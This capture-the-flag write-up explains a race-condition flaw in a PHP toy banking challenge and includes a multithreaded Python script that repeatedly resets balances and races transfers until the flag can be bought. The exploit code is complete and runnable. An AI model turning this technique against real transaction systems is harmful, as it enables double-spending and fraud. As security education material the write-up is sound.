## Acid Flag Bank (Moderate)

At the time of writing this challenge had the second lowest solve count of all the web challenges despite being only rated moderate. There is good reason for this - the solution isn't really all that complicated but pretty unexpected for a web challenge. 

As with most of these challenges the site displays it's own source code.
```
 <?php
require_once('flag.php');

class ChallDB
{
    public function __construct($flag)
    {
        $this->pdo = new SQLite3('/tmp/users.db');
        $this->flag = $flag;
    }
 
    public function updateFunds($id, $funds)
    {
        $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt->execute();
    }

    public function resetFunds()
    {
        $this->updateFunds(1, 247);
        $this->updateFunds(2, 0);
        return "Funds updated!";
    }

    public function getFunds($id)
    {
        $stmt = $this->pdo->prepare('select funds from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        return $result->fetchArray(SQLITE3_ASSOC)['funds'];
    }

    public function validUser($id)
    {
        $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        return $row['valid'] == true;
    }

    public function dumpUsers()
    {
        $result = $this->pdo->query("select id, funds from users");
        echo "<pre>";
        echo "ID FUNDS\n";
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            echo "{$row['id']}  {$row['funds']}\n";
        }
        echo "</pre>";
    }

    public function buyFlag($id)
    {
        if ($this->validUser($id) && $this->getFunds($id) > 247) {
            return $this->flag;
        } else {
            return "Insufficient funds!";
        }
    }

    public function clean($x)
    {
        return round((int)trim($x));
    }
}

$db = new challDB($flag);
if (isset($_GET['dump'])) {
    $db->dumpUsers();
} elseif (isset($_GET['reset'])) {
    echo $db->resetFunds();
} elseif (isset($_GET['flag'], $_GET['from'])) {
    $from = $db->clean($_GET['from']);
    echo $db->buyFlag($from);
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
    $to = $db->clean($_GET['to']);
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
        $db->updateFunds($from, $db->getFunds($from) - $amount);
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
    }
} else {
    echo highlight_file(__FILE__, true);
}
```
The class `ChallDB` is pretty self explainatory it implements some kind of banking system with 2 accounts. One has a balance of 247 and one has a balance 0. We can transfer funds between the accounts and reset them back to the original state. We can also attempt to buy the flag. The problem is we need at least 248 to do so but the total value of all accounts is only 247.

So how to we get more funds? There aren't any obvious bugs here and code is using prepared statements so it's not an sql injection either.

```
if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
    $db->updateFunds($from, $db->getFunds($from) - $amount);
    $db->updateFunds($to, $db->getFunds($to) + $amount);
}
```
The problem is this code here (in conjunction with the `resetFunds()` function). It opens a toctou race condition vulnerability where we can transfer the same funds multiple times. The `resetFunds()` methods allows us to easily many attempts at doing so.

```
import requests
import sys
import threading

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
cookies = {}

def reset():
    r = requests.get(target + '/?reset=', headers=headers, cookies=cookies)

def transfer():
    r = requests.get(target + '/?to=2&from=1&amount=200',headers=headers, cookies=cookies)

def get_flag():
    r = requests.get(target + '/?flag=&from=2', headers=headers, cookies=cookies)
    if "247" in r.text:
        print(r.text)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Target url required!!")
        sys.exit(1)
    target = sys.argv[1]
    for i in range(10000):
        threading.Thread(target=reset).start()
        threading.Thread(target=transfer).start()
        threading.Thread(target=transfer).start()
        threading.Thread(target=get_flag).start()
        threading.Thread(target=transfer).start() 
```

I used 5 threads, 3 to attempt the transfer, 1 to do the reset and one to attempt to buy the flag. It's run in a loop until the buying of the flag succeeds. This normally takes only a few seconds and runs.